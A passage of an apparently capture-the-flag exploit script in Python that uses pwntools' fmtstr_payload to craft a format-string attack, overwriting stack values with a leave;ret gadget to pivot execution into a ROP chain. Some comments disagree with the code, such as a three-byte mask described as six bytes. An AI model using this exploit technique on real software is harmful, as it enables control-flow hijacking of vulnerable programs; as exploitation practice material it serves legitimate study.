...
param_pos = int(0x1d0/ 8 + 6) # 0x168
ROP_start = old_rbp - 0x2a0 - 8


writes = {
    rsp: leave_ret & 0xffffff,     # Only write the lower 6 bytes
    new_rbp: ROP_start & 0xffffff  # ROP_start, lower 6 bytes
}


# Use pwntools' fmtstr_payload with no_dollars=True
payload += fmtstr_payload(
    offset = param_pos,
    writes = writes,
    numbwritten = printed,  # Initial bytes printed
    write_size = 'byte',
    strategy = 'small',
    badbytes = frozenset(),
    no_dollars = True
